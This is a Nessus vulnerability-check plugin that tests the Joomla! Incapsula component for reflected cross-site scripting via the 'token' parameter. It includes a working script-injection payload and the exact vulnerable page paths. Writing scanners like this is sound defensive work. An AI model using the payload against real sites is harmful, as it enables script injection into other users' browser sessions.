#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64484);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_bugtraq_id(57190);
  script_osvdb_id(89108);

  script_name(english:"Incapsula Component for Joomla! 'token' Parameter Multiple XSS");
  script_summary(english:"Attempts to inject script code via the token parameter.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple cross-site scripting vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The version of the Incapsula component for Joomla! running on the
remote host is affected by multiple cross-site scripting (XSS)
vulnerabilities in the Security.php and Performance.php scripts due to
improper sanitization of user-supplied input to the 'token' parameter
before using it to generate dynamic HTML content. An unauthenticated,
remote attacker can exploit this to inject arbitrary HTML and script
code into the user's browser session.");
  script_set_attribute(attribute:"see_also", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5121.php");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Joomla! version 1.4.6_c or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/01/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/12/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/02/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2013-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "Incapsula";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('<name>com_incapsula</name>');
  checks["/administrator/components/com_incapsula/incapsula.xml"]=regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );

}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

exploit = FALSE;
xss_test = '"><script>alert('+ "'" + SCRIPT_NAME - ".nasl" + '-' + unixtime() +
  "'" + ')</script>';

pages = make_list("Security.php", "Performance.php");

foreach page (pages)
{
  url = "/administrator/components/com_incapsula/assets/tips/en/" + page +
    "?token=" + urlencode(str:xss_test);

  res = http_send_recv3(
    method       : "GET",
    item         : dir + url,
    port         : port,
    exit_on_fail : TRUE
  );

  if (xss_test + '" target="' >< res[2])
  {
    exploit = TRUE;
    output = extract_pattern_from_resp(string:res[2], pattern:'ST:'+xss_test);
  }
  # stop after first successful attempt
  if (exploit) break;
}

if (!exploit) audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " component");

security_report_v4(
  port        : port,
  severity    : SECURITY_WARNING,
  xss         : TRUE,
  generic     : TRUE,
  request     : make_list(install_url + url),
  output      : chomp(output)
);
exit(0);
